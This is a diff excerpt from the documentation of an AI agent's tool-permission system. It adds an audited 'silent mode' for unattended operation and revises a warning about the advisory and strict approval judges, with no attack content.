+  autonomy_mode: standard
+
+  # Silent-mode sub-policies (live only while autonomy_mode is "silent"). They
+  # only replace the HUMAN ANSWER to a prompt (tool_confirm / step_limit /
+  # ask_user / review_prompt); they never weaken a gate: `deny` groups,
+  # containment, symlink/flowsh analysis and workspace auto-approval are
+  # unchanged, and every automatic decision is recorded as a persisted
+  # `autonomy_decision` session event (ASI10). In tool_confirm "judge" mode
+  # the strict judge holds final authority — its ALLOW executes, canonical
+  # hard reasons included, fully audited; "deny" is the judge-free hard floor.
+  # See [Silent Mode](#silent-mode-unattended-operation) and
+  # [ADR-053](../decisions/053-silent-mode.md).
+  silent_mode:
+    tool_confirm:  { mode: judge }    # judge | allow | deny
+    step_limit:    { mode: auto }     # auto | allow_once | allow_more | allow_always | deny | stop
+    ask_user:      { mode: disable }  # disable | enable
+    review_prompt: { mode: suppress } # suppress | allow
 
   # Indirect prompt injection defense
   injection_defense:
@@ -468,7 +541,7 @@ Notes: the `system` group is reserved (config validation rejects it); a blocklis
 
 - Setting a mutating group's policy to `allow` in production — removes all safety gates for every tool in that group
 - Tagging a tool `GroupSystem` without careful consideration — it bypasses everything; leaving a tool's group undeclared is equally wrong (it fails closed everywhere, including tool budgets and verifier sets)
-- Relying on the **advisory** judge as a primary safety mechanism — it is on-demand only; Smart Approve's strict judge is a gate, but when enabled it applies to every escalation through the unified funnel (including hard reasons); even so, a **canonical** hard reason (blocklist, a flowsh control, SSRF, symlink escape, or an unassessable input) is deterministically backstopped to confirmation and never passes Smart Approve auto-approval
+- Relying on the **advisory** judge as a primary safety mechanism — it is on-demand only; the assisted-mode strict judge is a gate, and when active it applies to every escalation through the unified funnel (including hard reasons); even so, a **canonical** hard reason (blocklist, a flowsh control, SSRF, symlink escape, or an unassessable input) is deterministically backstopped to confirmation on the interactive paths and never passes assisted-mode auto-approval (the silent `judge` terminal is the one deliberate, audited exception)
 - Implementing confirmation timeout — blocking indefinitely is intentional (user may be away)
 
 ## Related Specs
